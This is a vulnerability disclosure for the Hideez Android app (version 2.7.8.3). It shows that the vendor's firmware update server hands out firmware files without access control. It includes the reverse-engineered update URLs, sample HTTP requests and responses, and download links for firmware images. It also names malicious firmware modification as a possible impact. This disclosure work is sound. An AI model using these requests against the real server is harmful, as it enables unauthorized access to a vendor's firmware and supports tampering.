# Vulnerability Report - com.hideez- Incorrect Access Control

**Product:** `com.hideez`

**Vendor:** [Hideez](https://hideez.com/en-int)

**Version:** 2.7.8.3

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.hideez` , developed by **Hideez**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTP requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `URL_MT_JSON_ALPHA, URL_MT_JSON_BETA, URL_MT_JSON_RELEASE and so on` Field values in the `ConstantsCore` class provide the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003213950936](https://s2.loli.net/2024/10/03/EVk1XLs5HDdAQqj.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://update.hideez.com/firmware/STr3/release/update.json HTTP/1.0
   User-Agent: Fiddler
   Host: update.hideez.com
   ```

   ```http
   GET https://update.hideez.com/firmware/STr4/release/update.json HTTP/1.0
   User-Agent: Fiddler
   Host: update.hideez.com
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 Oct 2024 13:44:52 GMT
   Content-Type: application/json
   Content-Length: 363
   Connection: close
   Last-Modified: Fri, 23 Jul 2021 07:16:36 GMT
   ETag: "60fa6cd4-16b"
   X-Robots-Tag: noindex, nofollow
   Accept-Ranges: bytes
   CF-Cache-Status: DYNAMIC
   Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=y7S0VaUpwHnd%2FKyLCi6Du7D1sPE4b4GMsDfIigVJ9gUxDCW2OWRkvBz5q%2FkxXLK7e2t2e6FlBxz%2Bz%2BKXqoNVWhfkZ5UsM1LDvobDRc5t6MwK2WVeJcRm4hDYJNPzvHZ6t1H0Kw%3D%3D"}],"group":"cf-nel","max_age":604800}
   NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
   Strict-Transport-Security: max-age=2592000; includeSubDomains; preload
   Server: cloudflare
   CF-RAY: 8ccd5e8aa827042c-HKG
   
   {
   	"item": {
   		"title":"New firmware for Safetag available",
   		"name":"STr3_fw_v1.2.29_LE.img",
   		"version":"1.2.29",
   		"bootloader":"1.3.3",
   		"url":"https://update.hideez.com/firmware/STr3/release/STr3_fw_v1.2.29_LE.img",
   		"md5sum":"46BD1B11F5AEB634DB2803944A052AB2",
   		"changelog":"https://update.hideez.com/firmware/STr3/release/STr3_fw_v1.2.29_LE.txt"
   	}
   }
   ```

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 Oct 2024 13:45:39 GMT
   Content-Type: application/json
   Content-Length: 345
   Connection: close
   Last-Modified: Fri, 23 Jul 2021 07:16:18 GMT
   ETag: "60fa6cc2-159"
   X-Robots-Tag: noindex, nofollow
   Accept-Ranges: bytes
   cf-cache-status: DYNAMIC
   Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=lbudxDUjcjMssUP3w1ShpwQf%2BamsY1QBFMFULZc5VQJE3JSGe3Ml7wC525xyvLCgFTUiKdCKRQYqT7KYCkClVdtTvt5GZIT4A5MC4nqHPOvnvu6O5c%2B5XWpaEu13zEjEi1vCvw%3D%3D"}],"group":"cf-nel","max_age":604800}
   NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
   Strict-Transport-Security: max-age=2592000; includeSubDomains; preload
   Server: cloudflare
   CF-RAY: 8ccd5fb029fe108e-HKG
   
   {
   	"item": {
   		"title":"New firmware for Safetag available",
   		"name":"STr4_fw_v2.0.2.img",
   		"version":"2.0.2",
   		"bootloader":"",
   		"url":"https://update.hideez.com/firmware/STr4/release/STr4_fw_v2.0.2.img",
   		"md5sum":"A63787F2EBD9161E8C96DACE4491EE4A",
   		"changelog":"https://update.hideez.com/firmware/STr4/release/STr4_fw_v2.0.2.txt"
   	}
   }
   
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003214622814](https://s2.loli.net/2024/10/03/91dEsgnWyBOeVSl.png)

   In total, we successfully downloaded **4 firmware** by exploiting the vulnerability.

## Impact

An attacker can exploit this vulnerability to:

- Download the latest firmware before it is officially released.
- Analyze the firmware for vulnerabilities or proprietary information.
- Create modified firmware images with malicious code.
- Distribute compromised firmware updates to unsuspecting users.

## Remediation

- Implement proper access control on the firmware server, such as device ID and user ID verification.
- Enhance the app's firmware update mechanism to include authentication credentials in the requests.

## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.